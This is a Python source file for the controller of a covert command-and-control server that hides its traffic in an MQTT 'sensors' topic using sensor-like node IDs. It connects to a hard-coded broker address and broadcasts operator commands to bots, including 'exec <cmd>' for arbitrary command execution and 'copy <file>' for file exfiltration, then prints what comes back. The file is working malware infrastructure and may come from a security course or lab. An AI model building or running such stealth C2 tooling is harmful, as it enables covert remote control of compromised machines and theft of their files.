"""
Controller - MQTT C&C Server using layered protocol stack.
"""
import random
from protocol import ProtocolStack

# --- CONFIGURATION ---
BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"
SALT = "S4ur0ns_S3cr3t_S4lt_2025"
CONTROLLER_ID = f"sensor_{random.randint(100, 999)}1"  # Ends with 1 = hub
SEND_INTERVAL = 1.0


def handle_message(message: dict):
    """Handle incoming messages from the protocol stack."""
    msg_type = message.get("type")
    target = message.get("target")
    sender = message.get("sender")
    
    # Only handle responses targeted at us
    if msg_type != "response":
        return
    if target != CONTROLLER_ID:
        return
    
    output = message.get("output", "")
    print(f"\n[+] RESPONSE from {sender}:\n{output}\n")
    
    if output.startswith("FILE_START:"):
        print("(File content received)")


if __name__ == "__main__":
    # Create and start protocol stack
    stack = ProtocolStack(
        node_id=CONTROLLER_ID,
        broker=BROKER,
        port=PORT,
        topic=TOPIC,
        salt=SALT,
        send_interval=SEND_INTERVAL
    )
    
    # Register message handler
    stack.on_receive(handle_message)
    
    print("--- MQTT SECURE STEALTH C&C ---")
    print(f"Controller ID: {CONTROLLER_ID} (sending every {SEND_INTERVAL}s)")
    print(f"Chunk size: {stack.get_chunk_size()} bytes")
    print("Commands: ping, w, ls <dir>, id, copy <file>, exec <cmd>")
    
    stack.start()
    
    try:
        while True:
            cmd_str = input("C&C> ").strip()
            if not cmd_str:
                continue
            if cmd_str == "exit":
                break
            
            parts = cmd_str.split(" ", 1)
            cmd = parts[0]
            arg = parts[1] if len(parts) > 1 else ""
            
            stack.send("ALL", "command", cmd=cmd, arg=arg)
            print(f"[*] Command sent (will be chunked if large)")
    except KeyboardInterrupt:
        pass
    
    stack.stop()
    print("\n[*] Controller stopped.")